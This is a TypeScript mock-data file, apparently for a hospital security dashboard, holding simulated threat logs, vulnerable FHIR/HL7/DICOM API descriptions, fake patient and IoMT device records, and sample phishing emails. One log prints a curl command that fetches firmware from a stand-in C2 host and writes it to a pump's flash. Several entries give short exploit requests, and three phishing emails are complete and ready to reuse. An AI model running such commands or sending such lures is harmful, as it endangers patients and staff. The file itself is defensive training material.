import { ThreatEvent, ApiEndpoint, MedicalRecordDoc, IoMTDevice } from "../types";

export const initialThreats: ThreatEvent[] = [
  {
    id: "THREAT-9041",
    timestamp: "2 mins ago",
    sourceIp: "185.220.101.42 (Tor Exit Node)",
    targetAsset: "ICU Ward 4 - Smart Infusion Pump (IP: 10.24.110.15)",
    attackVector: "Unauthorized Telnet Brute Force & IoMT Firmware Tamper Attempt",
    severity: "CRITICAL",
    mitreTechnique: "T1210 (Exploitation of Remote Services) / T1542 (Firmware Corruption)",
    status: "ACTIVE",
    description: "Multiple failed root auth attempts followed by anomalous malformed command packet aiming to alter bolus rate limit.",
    rawLog: `2026-08-27T08:41:12.104Z [IoMT-FW-ALARM] Source: 185.220.101.42:49811 -> Dest: 10.24.110.15:23 [PORT_TELNET_EXPOSED]
PAYLOAD: 0x7F454C46... EXEC /bin/sh -c 'curl http://c2.medbotnet.su/pump_patch.bin > /dev/mtd0'
STATUS: DROPPED BY ZERO-TRUST FIREWALL GATEWAY. HSM ROOT VERIFICATION FAILED.`,
  },
  {
    id: "THREAT-9038",
    timestamp: "14 mins ago",
    sourceIp: "192.168.4.18 (Guest Wi-Fi)",
    targetAsset: "FHIR API Gateway (/api/v1/Patient/88219/clinical-notes)",
    attackVector: "Broken Object Level Authorization (BOLA / IDOR) Enumeration",
    severity: "HIGH",
    mitreTechnique: "T1595 (Active Scanning) / T1087 (Account Discovery)",
    status: "INVESTIGATING",
    description: "Automated scraper attempting sequential iteration of Patient MRNs with low-privilege receptionist session bearer token.",
    rawLog: `2026-08-27T08:29:44.821Z [API-GATEWAY-WARN] User: rec_clerk_09 | Role: RECEPTION
REQUEST: GET /fhir/r4/Patient/MRN-88219/DiagnosticReport?include=HIV_STATUS
RESPONSE: 403 FORBIDDEN - BOLA VIOLATION LOGGED. Request rate: 140 req/min from untrusted subnet.`,
  },
  {
    id: "THREAT-9032",
    timestamp: "45 mins ago",
    sourceIp: "104.244.72.115 (Spoofed Mail Gateway)",
    targetAsset: "Hospital Staff Inboxes (Radiology & Oncology Depts)",
    attackVector: "Spear-Phishing: Fake Urgent Malpractice Subpoena & Ransomware Dropper",
    severity: "HIGH",
    mitreTechnique: "T1566.001 (Spearphishing Attachment) / T1204 (User Execution)",
    status: "CONTAINED",
    description: "Inbound malicious email disguised as 'Urgent Medical Board Audit Notice' containing macro-enabled .xlsm payload.",
    rawLog: `2026-08-27T07:58:02.009Z [MAIL-SHIELD-ALERT] Sender: board-audit@medical-reg-gov.in [SPF: FAIL, DKIM: NONE]
Attachment: Notice_Subpoena_MRN_Case_901.xlsm (SHA256: 4a821e90b8f... Trojan.Heur.MacroHealth)
STATUS: Quarantined 14 recipient mailboxes. Automated user alert dispatched.`,
  },
  {
    id: "THREAT-9021",
    timestamp: "1 hour ago",
    sourceIp: "10.24.40.88 (Cardiology Workstation)",
    targetAsset: "PACS DICOM Imaging Server (Port 104 / 4242)",
    attackVector: "Unencrypted DICOM Exfiltration Attempt to External USB",
    severity: "MEDIUM",
    mitreTechnique: "T1052.001 (Exfiltration over USB) / HIPAA §164.312(a)(2)(iv)",
    status: "BLOCKED",
    description: "DLP agent intercepted mass export of 450 cardiac angiogram scans without encryption key tag.",
    rawLog: `2026-08-27T07:22:15.334Z [DLP-BLOCK] Process: MicroDicomViewer.exe -> Target: E:\\EXT_BACKUP_2026\\
Unencrypted DICOM header with patient name/MRN detected. Action: Mass export halted. Admin alert triggered.`,
  },
];

export const sampleApiEndpoints: ApiEndpoint[] = [
  {
    id: "api-fhir-patient",
    name: "FHIR R4 Patient Resource Endpoint",
    method: "GET",
    path: "/api/fhir/v4/Patient/{patientId}",
    category: "FHIR Patient",
    sampleRequest: {
      headers: {
        Authorization: "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",
        "X-Hospital-Tenant": "METRO_HEALTH_NORTH",
      },
      params: {
        patientId: "PAT-90821",
      },
    },
    sampleResponse: {
      resourceType: "Patient",
      id: "PAT-90821",
      name: [{ use: "official", family: "Sharma", given: ["Aarav"] }],
      gender: "male",
      birthDate: "1988-04-12",
      identifier: [
        { system: "urn:oid:aadhaar", value: "8841-9920-3310" },
        { system: "urn:oid:mrn", value: "MRN-55209" },
      ],
      telecom: [{ system: "phone", value: "+91-98765-43210" }],
      address: [{ city: "Mumbai", postalCode: "400001" }],
    },
    knownVulnerabilities: [
      {
        title: "Broken Object Level Authorization (BOLA / IDOR)",
        owaspCode: "API1:2023",
        severity: "CRITICAL",
        description: "An attacker with valid doctor token for Patient A can change {patientId} to Patient B and view full unmasked records without authorization check.",
        exploitPayload: "GET /api/fhir/v4/Patient/PAT-99999 HTTP/1.1\nHost: hospital-api.metro.org\nAuthorization: Bearer <Physician_Token_For_Different_Patient>",
        remediation: "Enforce strict care-team RBAC verification: Verify token clinician ID has active appointment or consented care relationship with requested patient.",
      },
      {
        title: "Excessive Sensitive Data Exposure",
        owaspCode: "API3:2023",
        severity: "HIGH",
        description: "Returns unmasked Aadhaar/SSN and direct telecom to general triage UI without field-level masking.",
        exploitPayload: "Response body leaking raw 'identifier[0].value'",
        remediation: "Apply DPDP Act & HIPAA Data Minimization filters. Return tokenized / masked identifier unless explicit ADMINISTRATIVE scope is authorized.",
      },
    ],
  },
  {
    id: "api-medication-dispense",
    name: "Prescription & Medication Order API",
    method: "POST",
    path: "/api/hl7/v2/MedicationRequest/dispense",
    category: "Prescription HL7",
    sampleRequest: {
      headers: {
        "Content-Type": "application/json",
        "X-Doctor-Token": "DOC_LIC_MH_88410",
      },
      body: {
        patientId: "PAT-90821",
        medicationCode: "RX-OXY-80MG",
        quantity: 60,
        refillsAllowed: 3,
        doctorSignature: "MOCK_SIG_UNVERIFIED",
      },
    },
    sampleResponse: {
      status: "DISPENSE_AUTHORIZED",
      orderId: "ORD-99120",
      dispensedAt: "2026-08-27T08:00:00Z",
    },
    knownVulnerabilities: [
      {
        title: "Missing Digital Cryptographic Signature Verification",
        owaspCode: "API8:2023",
        severity: "CRITICAL",
        description: "Narcotics dispensing accepts unsigned payload without validating physician's HSM/PKI private key signature.",
        exploitPayload: "POST payload with manipulated 'quantity: 600' and arbitrary medication code.",
        remediation: "Enforce ECDSA/RSA signature verification with doctor license public key certificate stored in Hospital HSM.",
      },
      {
        title: "Unrestricted Rate Limiting on Narcotic Order Queue",
        owaspCode: "API4:2023",
        severity: "MEDIUM",
        description: "No rate limit allows automated flooding or race conditions on pharmacy inventory locks.",
        exploitPayload: "1000 concurrent POST requests in 5 seconds to exhaust pharmacy inventory.",
        remediation: "Implement Token Bucket rate limiter (max 20 req/min per physician) + strict database row-level locking.",
      },
    ],
  },
  {
    id: "api-pacs-dicom",
    name: "PACS DICOM Image Retrieve Web (WADO-RS)",
    method: "GET",
    path: "/api/dicom/studies/{studyUID}/series/{seriesUID}/instances",
    category: "PACS DICOM",
    sampleRequest: {
      headers: {
        Accept: "multipart/related; type=application/dicom",
      },
      params: {
        studyUID: "1.2.840.113619.2.55.3.604688319",
      },
    },
    sampleResponse: {
      studyInstanceUID: "1.2.840.113619.2.55.3.604688319",
      patientName: "Sharma^Aarav",
      modality: "CT",
      dicomFileSizeMb: 48.2,
    },
    knownVulnerabilities: [
      {
        title: "Cross-Origin Resource Sharing (CORS) Wildcard (*)",
        owaspCode: "API7:2023",
        severity: "HIGH",
        description: "Server responds with 'Access-Control-Allow-Origin: *' allowing any malicious website visited by radiologist to fetch private DICOM CT scans.",
        exploitPayload: "Origin: https://evil-medical-scam.com\nResponse includes Access-Control-Allow-Origin: *",
        remediation: "Restrict CORS strictly to trusted hospital internal domain origins (e.g. https://pacs.metrohealth.org).",
      },
    ],
  },
];

export const sampleMedicalDocument: MedicalRecordDoc = {
  id: "REC-2026-8831",
  recordNumber: "EHR-MRN-90214",
  patientName: "Rohan Verma",
  dob: "1984-11-23",
  doctorName: "Dr. Ananya Iyer, MD (Cardiology)",
  doctorLicense: "NMC-IND-CARD-88492-MH",
  diagnosis: "Acute Coronary Syndrome, Stage 2 Hypertension with Angina Pectoris",
  prescriptions: [
    { drug: "Atorvastatin Calcium", dosage: "40mg", frequency: "Once daily at bedtime" },
    { drug: "Aspirin (Cardio-protective)", dosage: "75mg", frequency: "Once daily post meal" },
    { drug: "Nitroglycerin Sublingual", dosage: "0.4mg", frequency: "PRN for acute chest pain" },
  ],
  clinicalNotes: "Patient presented with retrosternal chest pain radiating to left arm. ECG reveals ST elevation in leads V2-V4. Immediate troponin I positive. Commenced dual antiplatelet therapy. Stent placement scheduled for 14:00.",
  createdDate: "2026-08-27T08:15:00Z",
  signatureTimestamp: "2026-08-27T08:16:30Z",
};

export const sampleIoMTFleet: IoMTDevice[] = [
  {
    id: "IOMT-PUMP-01",
    name: "Alaris Infusion Pump 8015 #04",
    type: "Infusion Pump",
    department: "ICU Ward 4",
    ipAddress: "10.24.110.15",
    macAddress: "00:1E:C0:88:42:A1",
    firmwareVersion: "v4.2.1-SECURE",
    hsmStatus: "SECURE_LOCKED",
    firmwareHash: "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
    isTampered: false,
    status: "NORMAL",
    telemetry: {
      battery: 94,
      networkPps: 12,
      cpuLoad: 18,
      lastHeartbeat: "Just now",
    },
  },
  {
    id: "IOMT-VENT-02",
    name: "Dräger Smart ICU Ventilator #02",
    type: "Smart Ventilator",
    department: "ICU Ward 4",
    ipAddress: "10.24.110.22",
    macAddress: "00:50:56:C0:00:08",
    firmwareVersion: "v3.8.0-PATCH-A",
    hsmStatus: "SECURE_LOCKED",
    firmwareHash: "8a4f912c9b3e64819d20c571932fa56788320491823abce12879035619284102",
    isTampered: false,
    status: "NORMAL",
    telemetry: {
      battery: 100,
      networkPps: 45,
      cpuLoad: 24,
      lastHeartbeat: "Just now",
    },
  },
  {
    id: "IOMT-MONITOR-03",
    name: "Philips IntelliVue Patient Telemetry #09",
    type: "ICU Patient Monitor",
    department: "Emergency Dept",
    ipAddress: "10.24.120.44",
    macAddress: "70:85:C2:55:1A:E9",
    firmwareVersion: "v2.9.4-LEGACY",
    hsmStatus: "ALERT",
    firmwareHash: "f1a2384910283c48576d19283746501928374659102938475610293847561029",
    isTampered: true,
    status: "ANOMALOUS",
    telemetry: {
      battery: 68,
      networkPps: 1420, // Abnormal burst!
      cpuLoad: 92,
      lastHeartbeat: "10s ago",
    },
  },
  {
    id: "IOMT-MRI-04",
    name: "Siemens Magnetom 3T MRI Gateway",
    type: "MRI/CT Gateway",
    department: "Radiology",
    ipAddress: "10.24.130.80",
    macAddress: "00:0C:29:8B:11:F2",
    firmwareVersion: "v5.1.0-ENTERPRISE",
    hsmStatus: "SECURE_LOCKED",
    firmwareHash: "3298a098bcde4921098402938492019482019482019482019482019482019482",
    isTampered: false,
    status: "NORMAL",
    telemetry: {
      battery: 100,
      networkPps: 88,
      cpuLoad: 31,
      lastHeartbeat: "Just now",
    },
  },
  {
    id: "IOMT-DISPENSER-05",
    name: "Pyxis MedStation Automated Narcotic Vault",
    type: "Medication Dispenser",
    department: "Pharmacy",
    ipAddress: "10.24.140.12",
    macAddress: "00:1A:2B:3C:4D:5E",
    firmwareVersion: "v4.0.2-HSM",
    hsmStatus: "SECURE_LOCKED",
    firmwareHash: "9012849102938401928304918203948102938401928304918203948102938401",
    isTampered: false,
    status: "NORMAL",
    telemetry: {
      battery: 98,
      networkPps: 16,
      cpuLoad: 14,
      lastHeartbeat: "Just now",
    },
  },
];

export const phishingScenarios = [
  {
    id: "phish-1",
    title: "Urgent Malpractice Board Audit (Spear-Phishing Attachment)",
    sender: "disciplinary-committee@medical-council-reg-gov.in",
    subject: "URGENT & CONFIDENTIAL: Medical License Notice of Immediate Hearing",
    content: `Dear Dr. Iyer,

The State Medical Council has received a formal malpractice affidavit regarding emergency case record EHR-MRN-90214. 

Failure to acknowledge receipt within 2 hours will result in provisional suspension of your hospital prescribing credentials.

Please download and review the official subpoena order with full clinical depositions attached below:
Attachment: Notice_Subpoena_MRN_Case_901.xlsm (Enable Macros to sign digital verification)

Regards,
Dr. V. K. Malhotra
Registrar, Medical Disciplinary Board`,
  },
  {
    id: "phish-2",
    title: "Fake Hospital IT Helpdesk (MFA Credential Harvester)",
    sender: "it-support@metro-health-portal.org",
    subject: "ACTION REQUIRED: Mandatory Hospital SSO 2FA Security Upgrade",
    content: `All Metropolitan Healthcare Clinicians & Staff:

Due to recent cybersecurity threats, our PACS and EHR systems are migrating to Microsoft Azure Authenticator 3.0 tonight at 22:00.

You MUST confirm your current active credentials and recovery PIN immediately to maintain uninterrupted access to the emergency pharmacy and patient vitals:

Click here to verify credentials: https://metrohealth-sso-verify.auth-update-gateway.cc/login

Failure to verify will lock your workstation during shift change.

Hospital IT Infrastructure Team`,
  },
  {
    id: "phish-3",
    title: "Stat Organ Transport Dispatch (Urgency Social Engineering)",
    sender: "transplant-coordination@organ-sharing-network-in.com",
    subject: "STAT: Donor Heart Match Approved for Patient Bed ICU-4B - Verify Acceptance",
    content: `STAT NOTIFICATION - ICU ATTENDING:

A donor heart has been matched for immediate dispatch to Metro Health OR-3. 

The courier flight departs in 45 minutes. You must immediately confirm receiving authorization by executing the embedded clinical transport manifest link:

http://organ-dispatch-fastpass.net/manifest_download.exe

Organ Allocation Protocol Secretariat`,
  },
];
